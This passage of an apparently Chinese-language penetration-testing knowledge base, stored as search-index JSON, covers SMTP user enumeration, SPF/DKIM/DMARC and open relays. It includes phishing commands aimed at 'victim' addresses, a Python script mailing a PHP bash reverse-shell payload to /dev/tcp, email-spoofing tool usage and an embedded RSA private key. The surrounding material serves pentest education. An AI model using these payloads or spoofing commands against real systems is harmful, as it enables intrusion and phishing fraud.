User unknown RCPT TO:admin 550 5.1.1 admin... User unknown RCPT TO:ed 250 2.1.5 ed... Recipient ok","title":"\u6536\u4ef6\u4eba"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#vrfy","text":"$ telnet 10.0.0.1 25 Trying 10.0.0.1... Connected to 10.0.0.1. Escape character is '^]'. 220 myhost ESMTP Sendmail 8.9.3 HELO 501 HELO requires domain address HELO x 250 myhost Hello [10.0.0.99], pleased to meet you VRFY root 250 Super-User <root@myhost> VRFY blah 550 blah... User unknown","title":"VRFY"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#expn","text":"$ telnet 10.0.10.1 25 Trying 10.0.10.1... Connected to 10.0.10.1. Escape character is '^]'. 220 myhost ESMTP Sendmail 8.9.3 HELO 501 HELO requires domain address HELO x EXPN test 550 5.1.1 test... User unknown EXPN root 250 2.1.5 <ed.williams@myhost> EXPN sshd 250 2.1.5 sshd privsep <sshd@mail2> \u6458\u81ea: https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/","title":"EXPN"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_7","text":"Metasploit: auxiliary/scanner/smtp/smtp_enum smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP> Nmap: nmap --script smtp-enum-users <IP>","title":"\u81ea\u52a8\u5de5\u5177"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dsn","text":"\u6295\u9012\u72b6\u6001\u901a\u77e5\u62a5\u544a \uff1a\u5982\u679c\u60a8\u5411\u67d0\u4e2a\u7ec4\u7ec7\u53d1\u9001 \u7535\u5b50\u90ae\u4ef6 \u81f3 \u65e0\u6548\u5730\u5740 \uff0c\u8be5\u7ec4\u7ec7\u5c06\u901a\u77e5\u8be5\u5730\u5740\u65e0\u6548 \u5e76\u5411\u60a8\u53d1\u56de\u90ae\u4ef6 \u3002 \u8fd4\u56de\u7535\u5b50\u90ae\u4ef6\u7684\u6807\u9898 \u5c06 \u5305\u542b \u53ef\u80fd\u7684 \u654f\u611f\u4fe1\u606f \uff08\u4f8b\u5982\u4e0e\u62a5\u544a\u4ea4\u4e92\u7684\u90ae\u4ef6\u670d\u52a1\u7684 IP \u5730\u5740\u6216\u9632\u75c5\u6bd2\u8f6f\u4ef6\u4fe1\u606f\uff09\u3002","title":"DSN \u8fd4\u56de"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_8","text":"","title":"[\u547d\u4ee4]"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#linux","text":"root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf Reading message body from STDIN because the '-m' option was not used. If you are manually typing in a message: - First line must be received within 60 seconds. - End manual input with a CTRL-D on its own line. IT Dept, We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems. Sincerely, swaks --to $(cat emails | tr '\\n' ',' | less) --from test@sneakymailer.htb --header \"Subject: test\" --body \"please click here http://10.10.14.42/\" --server 10.10.10.197","title":"\u4ece linux \u63a7\u5236\u53f0\u53d1\u9001\u7535\u5b50\u90ae\u4ef6"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#python","text":"\u8fd9\u662f\u4f7f\u7528 python \u811a\u672c\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u66ff\u4ee3\u65b9\u6cd5 from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText import smtplib import sys lhost = \"127.0.0.1\" lport = 443 rhost = \"192.168.1.1\" rport = 25 # 489,587 # create message object instance msg = MIMEMultipart() # setup the parameters of the message password = \"\" msg['From'] = \"attacker@local\" msg['To'] = \"victim@local\" msg['Subject'] = \"This is not a drill!\" # payload message = (\"<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>\" % (lhost,lport)) print(\"[*] Payload is generated : %s\" % message) msg.attach(MIMEText(message, 'plain')) server = smtplib.SMTP(host=rhost,port=rport) if server.noop()[0] != 250: print(\"[-]Connection Error\") exit() server.starttls() # Uncomment if log-in with authencation # server.login(msg['From'], password) server.sendmail(msg['From'], msg['To'], msg.as_string()) server.quit() print(\"[***]successfully sent email to %s:\" % (msg['To']))","title":"\u4f7f\u7528 Python \u53d1\u9001\u7535\u5b50\u90ae\u4ef6"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_9","text":"\u672c\u8282\u7684\u5927\u90e8\u5206\u5185\u5bb9\u6458\u81ea \u7f51\u7edc\u5b89\u5168\u8bc4\u4f30\u7b2c 3 \u7248\u4e00\u4e66 \u3002 SMTP \u6d88\u606f\u5f88\u5bb9\u6613\u88ab\u6b3a\u9a97\uff0c\u56e0\u6b64\u7ec4\u7ec7\u4f7f\u7528 SPF \u3001 DKIM \u548c DMARC \u529f\u80fd\u6765\u9632\u6b62\u5404\u65b9\u53d1\u9001\u672a\u7ecf\u6388\u6743\u7684\u7535\u5b50\u90ae\u4ef6\u3002 \u6709\u5173\u8fd9\u4e9b\u5bf9\u7b56 \u7684\u5b8c\u6574\u6307\u5357\uff0c\u8bf7\u8bbf\u95eehttps://seanthegeek.net/459/demystifying-dmarc/","title":"\u90ae\u4ef6\u6b3a\u9a97"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#spf","text":"\u53d1\u4ef6\u4eba\u7b56\u7565\u6846\u67b6 (SPF) \u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u5141\u8bb8 MTA \u68c0\u67e5\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u4e3b\u673a\u662f\u5426\u7ecf\u8fc7\u6388\u6743\u3002 \u7136\u540e\uff0c\u7ec4\u7ec7\u53ef\u4ee5\u5b9a\u4e49\u6388\u6743\u90ae\u4ef6\u670d\u52a1\u5668\u5217\u8868\uff0cMTA \u53ef\u4ee5\u67e5\u8be2\u6b64\u5217\u8868\u4ee5\u68c0\u67e5\u7535\u5b50\u90ae\u4ef6\u662f\u5426\u88ab\u6b3a\u9a97\u3002 \u4e3a\u4e86\u5b9a\u4e49 IP \u5730\u5740/\u8303\u56f4\u3001\u57df\u548c\u5176\u4ed6 \u5141\u8bb8\u4ee3\u8868\u57df\u540d\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u4eba\uff0c SPF \u6ce8\u518c\u8868\u4e2d\u51fa\u73b0\u4e86\u4e0d\u540c\u7684 \u201c\u673a\u5236\u201d\u3002","title":"SPF"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_10","text":"Mechanism Description ALL \u59cb\u7ec8\u5339\u914d\uff1b\u7528\u4e8e\u9ed8\u8ba4\u7ed3\u679c\uff0c\u4f8b\u5982 -all \u6240\u6709\u4e0e\u5148\u524d\u673a\u5236\u4e0d\u5339\u914d\u7684 IP\u3002 A \u5982\u679c\u57df\u540d\u6709\u53ef\u4ee5\u89e3\u6790\u5230\u53d1\u4ef6\u4eba\u5730\u5740\u7684\u5730\u5740\u8bb0\u5f55\uff08A\u6216AAAA\uff09\uff0c\u5219\u5339\u914d\u3002 IP4 \u5982\u679c\u53d1\u4ef6\u4eba\u5728\u7ed9\u5b9a\u7684 IPv4 \u5730\u5740\u8303\u56f4\u5185\uff0c\u5219\u5339\u914d\u3002 IP6 \u5982\u679c\u53d1\u4ef6\u4eba\u5728\u7ed9\u5b9a\u7684 IPv6 \u5730\u5740\u8303\u56f4\u5185\uff0c\u5219\u5339\u914d\u3002 MX \u5982\u679c\u57df\u540d\u6709\u89e3\u6790\u4e3a\u53d1\u4ef6\u4eba\u5730\u5740\u7684 MX \u8bb0\u5f55\uff0c\u5b83\u5c06\u5339\u914d\uff08\u5373\u90ae\u4ef6\u6765\u81ea\u57df\u7684\u63a5\u6536\u90ae\u4ef6\u670d\u52a1\u5668\u4e4b\u4e00\uff09\u3002 PTR \u5982\u679c\u5ba2\u6237\u7aef\u5730\u5740\u7684\u57df\u540d\uff08PTR \u8bb0\u5f55\uff09\u5728\u7ed9\u5b9a\u57df\u4e2d\u5e76\u4e14\u8be5\u57df\u540d\u89e3\u6790\u4e3a\u5ba2\u6237\u7aef\u5730\u5740\uff08\u6b63\u5411\u786e\u8ba4\u7684\u53cd\u5411 DNS\uff09\uff0c\u5219\u5339\u914d\u3002\u8fd9\u79cd\u673a\u5236\u662f\u4e0d\u9f13\u52b1\u7684\uff0c\u5e94\u8be5\u5c3d\u53ef\u80fd\u907f\u514d\u3002 EXISTS \u5982\u679c\u7ed9\u5b9a\u7684\u57df\u540d\u89e3\u6790\u4e3a\u4efb\u4f55\u5730\u5740\uff0c\u5219\u5339\u914d\uff08\u65e0\u8bba\u5b83\u89e3\u6790\u4e3a\u54ea\u4e2a\u5730\u5740\uff09\u3002\u8fd9\u5f88\u5c11\u4f7f\u7528\u3002\u5b83\u4e0e SPF \u5b8f\u8bed\u8a00\u4e00\u8d77\u63d0\u4f9b\u66f4\u590d\u6742\u7684\u5339\u914d\uff0c\u5982 DNSBL \u67e5\u8be2\u3002 INCLUDE \u5f15\u7528\u53e6\u4e00\u4e2a\u57df\u7684\u7b56\u7565\u3002\u5982\u679c\u8be5\u57df\u7684\u7b56\u7565\u901a\u8fc7\uff0c\u5219\u6b64\u673a\u5236\u901a\u8fc7\u3002\u4f46\u662f\uff0c\u5982\u679c\u5305\u542b\u7684\u7b56\u7565\u5931\u8d25\uff0c\u5904\u7406\u5c06\u7ee7\u7eed\u3002\u8981\u5b8c\u5168\u59d4\u6258\u7ed9\u53e6\u4e00\u4e2a\u57df\u7684\u7b56\u7565\uff0c\u5fc5\u987b\u4f7f\u7528\u91cd\u5b9a\u5411\u6269\u5c55\u3002 REDIRECT \u91cd\u5b9a\u5411\u662f\u6307\u5411\u6258\u7ba1 SPF \u7b56\u7565\u7684\u53e6\u4e00\u4e2a\u57df\u540d\u7684\u6307\u9488\uff0c\u5b83\u5141\u8bb8\u591a\u4e2a\u57df\u5171\u4eab\u76f8\u540c\u7684 SPF \u7b56\u7565\u3002\u5728\u5904\u7406\u5171\u4eab\u76f8\u540c\u7535\u5b50\u90ae\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u5927\u91cf\u57df\u65f6\uff0c\u5b83\u5f88\u6709\u7528\u3002 \u8fd8\u53ef\u4ee5\u8bc6\u522b\u6307\u793a \u5339\u914d\u673a\u5236\u65f6\u5e94\u6267\u884c\u7684\u64cd\u4f5c\u7684\u9650\u5b9a\u7b26 \u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528 \u9650\u5b9a\u7b26 \u201c+\u201d \uff08\u56e0\u6b64\uff0c\u5982\u679c\u4efb\u4f55\u673a\u5236\u5339\u914d\uff0c\u5219\u610f\u5473\u7740\u5b83\u662f\u5141\u8bb8\u7684\uff09\u3002 \u60a8\u901a\u5e38\u4f1a \u5728\u6bcf\u4e2a SPF \u653f\u7b56\u7684\u672b\u5c3e\u6ce8\u660e \uff1a ~all \u6216 -all \u3002\u8fd9\u7528\u4e8e\u6307\u793a \u5982\u679c\u53d1\u4ef6\u4eba\u4e0d\u7b26\u5408\u4efb\u4f55 SPF \u7b56\u7565\uff0c\u60a8\u5e94\u8be5\u5c06\u7535\u5b50\u90ae\u4ef6\u6807\u8bb0\u4e3a\u4e0d\u53d7\u4fe1\u4efb (~) \u6216\u62d2\u7edd (-) \u7535\u5b50\u90ae\u4ef6\u3002","title":"\u673a\u5236"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_11","text":"\u6bcf\u4e2a\u673a\u5236\u90fd\u53ef\u4ee5\u4e0e\u56db\u4e2a\u9650\u5b9a\u7b26\u4e4b\u4e00\u7ec4\u5408\uff1a + \u5bf9\u4e8e PASS \u7ed3\u679c\u3002\u8fd9\u4e2a\u53ef\u4ee5\u7701\u7565\uff1b\u4f8b\u5982\uff0c +mx \u4e0e \u76f8\u540c mx \u3002 ? \u5bf9\u4e8e\u89e3\u91ca\u4e3a NONE\uff08\u65e0\u653f\u7b56\uff09\u7684 NEUTRAL \u7ed3\u679c\u3002 ~ \uff08\u4ee3\u5b57\u53f7\uff09\u4ee3\u8868 SOFTFAIL\uff0c\u4e00\u79cd\u4ecb\u4e8e NEUTRAL \u548c FAIL \u4e4b\u95f4\u7684\u8c03\u8bd5\u8f85\u52a9\u5de5\u5177\u3002\u901a\u5e38\uff0c\u8fd4\u56de SOFTFAIL \u7684\u6d88\u606f\u4f1a\u88ab\u63a5\u53d7\u4f46\u4f1a\u88ab\u6807\u8bb0\u3002 - \uff08\u51cf\u53f7\uff09\u5bf9\u4e8e\u5931\u8d25\uff0c\u90ae\u4ef6\u5e94\u8be5\u88ab\u62d2\u7edd\uff08\u89c1\u4e0b\u6587\uff09\u3002 \u5728\u4e0b\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u60a8\u53ef\u4ee5\u9605\u8bfb google.com \u7684 SPF \u7b56\u7565 \u3002\u8bf7\u6ce8\u610f\u7b2c \u4e00\u4e2a SPF \u7b56\u7565\u5982\u4f55\u5305\u542b\u5176\u4ed6\u57df\u7684 SPF \u7b56\u7565\uff1a kali@kali:~$ dig txt google.com | grep spf google.com. 235 IN TXT \"v=spf1 include:_spf.google.com ~all\" kali@kali:~$ dig txt _spf.google.com | grep spf ; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com ;_spf.google.com. IN TXT _spf.google.com. 235 IN TXT \"v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all\" kali@kali:~$ dig txt _netblocks.google.com | grep spf _netblocks.google.com. 1606 IN TXT \"v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all\" kali@kali:~$ dig txt _netblocks2.google.com | grep spf _netblocks2.google.com. 1908 IN TXT \"v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all\" kali@kali:~$ dig txt _netblocks3.google.com | grep spf _netblocks3.google.com. 1903 IN TXT \"v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all\" \u4f20\u7edf\u4e0a\uff0c\u53ef\u4ee5\u6b3a\u9a97\u4efb\u4f55\u6ca1\u6709\u6b63\u786e/\u4efb\u4f55 SPF \u8bb0\u5f55\u7684\u57df\u540d\u3002 \u5982\u4eca \uff0c\u5982\u679c \u7535\u5b50\u90ae\u4ef6 \u6765\u81ea \u6ca1\u6709\u6709\u6548 SPF \u8bb0\u5f55\u7684\u57df\uff0c \u53ef\u80fd\u4f1a \u81ea\u52a8\u88ab\u62d2\u7edd/\u6807\u8bb0\u4e3a\u4e0d\u53d7\u4fe1\u4efb \u3002 \u8981\u68c0\u67e5\u57df\u7684 SPF\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u5de5\u5177\uff0c\u4f8b\u5982\uff1a https://www.kitterman.com/spf/validate.html","title":"\u9650\u5b9a\u6761\u4ef6"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dkim","text":"DomainKeys Identified Mail (DKIM) \u662f\u4e00\u79cd\u673a\u5236\uff0c\u901a\u8fc7\u8be5\u673a\u5236\uff0c \u5916\u56fd MTA \u5728\u901a\u8fc7 DNS \u68c0\u7d22\u57df\u7684\u516c\u94a5\u65f6\u5bf9\u51fa\u7ad9\u7535\u5b50\u90ae\u4ef6\u8fdb\u884c\u7b7e\u540d\u548c\u9a8c\u8bc1 \u3002DKIM \u516c\u94a5\u4fdd\u5b58\u5728\u57df\u7684 TXT \u8bb0\u5f55\u4e2d\uff1b\u4f46\u662f\uff0c\u60a8\u5fc5\u987b\u77e5\u9053\u9009\u62e9\u5668\u548c\u57df\u540d\u624d\u80fd\u68c0\u7d22\u5b83\u3002 \u7136\u540e\uff0c\u8981\u8bf7\u6c42\u5bc6\u94a5\uff0c\u60a8\u9700\u8981\u57df\u540d\u548c\u90ae\u4ef6\u6807\u9898\u4e2d\u7684\u90ae\u4ef6\u9009\u62e9\u5668\uff0c DKIM-Signature \u4f8b\u5982\uff1a d=gmail.com;s=20120113 dig 20120113._domainkey.gmail.com TXT | grep p= 20120113._domainkey.gmail.com. 280 IN TXT \"k=rsa\\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3","title":"DKIM"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dmarc","text":"\u57fa\u4e8e\u57df\u7684\u6d88\u606f\u8eab\u4efd\u9a8c\u8bc1\u3001\u62a5\u544a\u548c\u4e00\u81f4\u6027 (DMARC) \u662f\u4e00\u79cd\u5728 SPF \u548c DKIM \u57fa\u7840\u4e0a\u6269\u5c55\u7684\u90ae\u4ef6\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\u3002\u7b56\u7565\u6307\u793a\u90ae\u4ef6\u670d\u52a1\u5668\u5982\u4f55\u5904\u7406\u7ed9\u5b9a\u57df\u7684\u7535\u5b50\u90ae\u4ef6\u5e76\u62a5\u544a\u6267\u884c\u7684\u64cd\u4f5c\u3002 \u83b7\u53d6DMARC\u8bb0\u5f55\u9700\u8981\u67e5\u8be2\u5b50\u57df\u540d_dmarc root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC _dmarc.yahoo.com. 1785 IN TXT \"v=DMARC1\\; p=reject\\; sp=none\\; pct=100\\; rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\\;\" root@kali:~# dig _dmarc.google.com txt | grep DMARC _dmarc.google.com. 600 IN TXT \"v=DMARC1\\; p=quarantine\\; rua=mailto:mailauth-reports@google.com\" root@kali:~# dig _dmarc.paypal.com txt | grep DMARC _dmarc.paypal.com. 300 IN TXT \"v=DMARC1\\; p=reject\\; rua=mailto:d@rua.agari.com\\; ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com\" PayPal \u548c Yahoo \u6307\u793a\u90ae\u4ef6\u670d\u52a1\u5668\u62d2\u7edd\u5305\u542b\u65e0\u6548 DKIM \u7b7e\u540d\u6216\u5e76\u975e\u6765\u81ea\u5176\u7f51\u7edc\u7684\u90ae\u4ef6\u3002\u7136\u540e\u5c06\u901a\u77e5\u53d1\u9001\u5230\u6bcf\u4e2a\u7ec4\u7ec7\u5185\u7684\u76f8\u5e94\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002\u8c37\u6b4c\u4ee5\u7c7b\u4f3c\u7684\u65b9\u5f0f\u914d\u7f6e\uff0c\u5c3d\u7ba1\u5b83\u6307\u793a\u90ae\u4ef6\u670d\u52a1\u5668\u9694\u79bb\u90ae\u4ef6\u800c\u4e0d\u662f\u5b8c\u5168\u62d2\u7edd\u5b83\u4eec\u3002","title":"DMARC"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dmarc_1","text":"Tag Name Purpose Sample v \u534f\u8bae\u7248\u672c v=DMARC1 pct \u53d7\u5230\u8fc7\u6ee4\u7684\u6d88\u606f\u7684\u767e\u5206\u6bd4 pct=20 ruf \u53d6\u8bc1\u62a5\u544a\u7684\u62a5\u544a URI ruf=mailto:authfail@example.com rua \u6c47\u603b\u62a5\u544a\u7684\u62a5\u544a URI rua=mailto:aggrep@example.com p \u7ec4\u7ec7\u57df\u7b56\u7565 p=quarantine sp OD \u5b50\u57df\u7684\u7b56\u7565 sp=reject adkim DKIM \u7684\u5bf9\u9f50\u6a21\u5f0f adkim=s aspf SPF \u5bf9\u9f50\u6a21\u5f0f aspf=r","title":"DMARC \u6807\u7b7e"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_12","text":"\u4ece\u8fd9\u91cc \u5f00\u59cb . \u60a8\u9700\u8981\u4e3a\u60a8\u5e0c\u671b\u4ece\u4e2d\u53d1\u9001\u90ae\u4ef6\u7684\u6bcf\u4e2a\u5b50\u57df\u62e5\u6709\u5355\u72ec\u7684 SPF \u8bb0\u5f55\u3002 \u4ee5\u4e0b\u5185\u5bb9\u6700\u521d\u53d1\u5e03\u5728 openspf.org \u4e0a\uff0c\u8be5\u7f51\u7ad9\u66fe\u7ecf\u662f\u6b64\u7c7b\u5185\u5bb9\u7684\u91cd\u8981\u8d44\u6e90\u3002 \u96be\u641e\u7684\u95ee\u9898: \u5b50\u57df\u5462\uff1f \u5982\u679c\u6211\u6536\u5230\u6765\u81ea pielovers.demon.co.uk \u7684\u90ae\u4ef6\uff0c\u5e76\u4e14\u6ca1\u6709 pielovers \u7684 SPF \u6570\u636e\uff0c\u6211\u662f\u5426\u5e94\u8be5\u8fd4\u56de\u4e00\u7ea7\u5e76\u6d4b\u8bd5 demon.co.uk \u7684 SPF\uff1f\u4e0d\u3002Demon \u7684\u6bcf\u4e2a\u5b50\u57df\u90fd\u662f\u4e0d\u540c\u7684\u5ba2\u6237\uff0c\u6bcf\u4e2a\u5ba2\u6237\u53ef\u80fd\u6709\u81ea\u5df1\u7684\u653f\u7b56\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b Demon \u7684\u653f\u7b56\u9002\u7528\u4e8e\u6240\u6709\u5ba2\u6237\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff1b\u5982\u679c Demon \u60f3\u8981\u8fd9\u6837\u505a\uff0c\u5b83\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u5b50\u57df\u8bbe\u7f6e SPF \u8bb0\u5f55\u3002 \u56e0\u6b64\uff0c\u5bf9 SPF \u53d1\u5e03\u8005\u7684\u5efa\u8bae\u662f\uff1a\u60a8\u5e94\u8be5\u4e3a\u6bcf\u4e2a\u5177\u6709 A \u6216 MX \u8bb0\u5f55\u7684\u5b50\u57df\u6216\u4e3b\u673a\u540d\u6dfb\u52a0 SPF \u8bb0\u5f55\u3002 \u5177\u6709\u901a\u914d\u7b26 A \u6216 MX \u8bb0\u5f55\u7684\u7ad9\u70b9\u8fd8\u5e94\u5177\u6709\u901a\u914d\u7b26 SPF \u8bb0\u5f55\uff0c\u683c\u5f0f\u4e3a\uff1a* IN TXT \"v=spf1 -all\" \u8fd9\u662f\u6709\u9053\u7406\u7684\u2014\u2014\u4e00\u4e2a\u5b50\u57df\u5f88\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u5730\u7406\u4f4d\u7f6e\u5e76\u4e14\u5177\u6709\u975e\u5e38\u4e0d\u540c\u7684 SPF \u5b9a\u4e49\u3002","title":"\u5b50\u57df\u5462\uff1f"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_13","text":"\u4e3a\u9632\u6b62\u53d1\u9001\u7684\u90ae\u4ef6\u88ab\u5783\u573e\u90ae\u4ef6\u8fc7\u6ee4\u5668\u8fc7\u6ee4\u800c\u65e0\u6cd5\u5230\u8fbe\u6536\u4ef6\u4eba\uff0c\u53d1\u4ef6\u4eba\u53ef\u4ee5\u4f7f\u7528 \u6536\u4ef6\u4eba\u4fe1\u4efb\u7684\u4e2d\u7ee7\u670d\u52a1\u5668 \u3002\u901a\u5e38\uff0c\u7ba1\u7406\u5458 \u6ca1\u6709\u6982\u8ff0 \u4ed6\u4eec\u5fc5\u987b \u5141\u8bb8 \u54ea\u4e9b IP\u8303\u56f4 \u3002\u8fd9\u4f1a\u5bfc\u81f4\u6211\u4eec\u5728\u5916\u90e8\u548c\u5185\u90e8\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4ecd\u7136\u7ecf\u5e38\u53d1\u73b0\u7684 SMTP \u670d\u52a1\u5668\u914d\u7f6e\u9519\u8bef\u3002\u56e0\u6b64\uff0c\u5b83\u4eec \u5141\u8bb8\u6240\u6709 IP \u5730\u5740 \u4e0d\u4f1a\u5728\u7535\u5b50\u90ae\u4ef6\u6d41\u91cf\u4e2d\u9020\u6210\u9519\u8bef\uff0c\u4ece\u800c\u4e0d\u4f1a\u5e72\u6270\u6216\u65e0\u610f\u4e2d\u4e2d\u65ad\u4e0e\u6f5c\u5728\u548c\u5f53\u524d\u5ba2\u6237\u7684\u901a\u4fe1\uff1a mynetworks = 0.0.0.0/0 nmap -p25 --script smtp-open-relay 10.10.10.10 -v","title":"\u6253\u5f00\u4e2d\u7ee7"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_14","text":"https://github.com/serain/mailspoof \u68c0\u67e5 SPF \u548c DMARC \u914d\u7f6e\u9519\u8bef https://pypi.org/project/checkdmarc/ \u81ea\u52a8\u83b7\u53d6 SPF \u548c DMARC \u914d\u7f6e","title":"\u5de5\u5177"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_15","text":"https://www.mailsploit.com/index http://www.anonymailer.net/ https://emkei.cz/ \u6216\u8005\u4f60\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5de5\u5177\uff1a https://github.com/magichk/magicspoofing # \u8fd9\u5c06\u4ecetest@victim.com\u53d1\u9001\u6d4b\u8bd5\u7535\u5b50\u90ae\u4ef6\u5230destination@gmail.com python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com # \u4f46\u4f60\u4e5f\u53ef\u4ee5\u4fee\u6539\u90ae\u4ef6\u7684\u66f4\u591a\u9009\u9879 python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com \u5982\u679c\u60a8 \u5728 dkim python \u5e93 \u4e2d\u4f7f\u7528\u89e3\u6790\u5bc6\u94a5\u65f6\u9047\u5230\u4efb\u4f55\u9519\u8bef\uff0c\u8bf7\u968f\u610f\u4f7f\u7528\u4ee5\u4e0b\u4e00\u4e2a\u3002 \u6ce8\u610f \uff1a\u8fd9\u53ea\u662f\u4e00\u4e2a\u80ae\u810f\u7684\u4fee\u590d\uff0c\u7528\u4e8e\u5728\u7531\u4e8e\u67d0\u79cd\u539f\u56e0 openssl \u79c1\u94a5 \u65e0\u6cd5\u88ab dkim \u89e3\u6790\u7684 \u60c5\u51b5\u4e0b\u8fdb\u884c\u5feb\u901f\u68c0\u67e5\u3002 -----BEGIN RSA PRIVATE KEY----- MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1 koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ== -----END RSA PRIVATE KEY----- \u6216\u8005\u4f60\u53ef\u4ee5\u624b\u52a8\u5b8c\u6210\uff1a php # 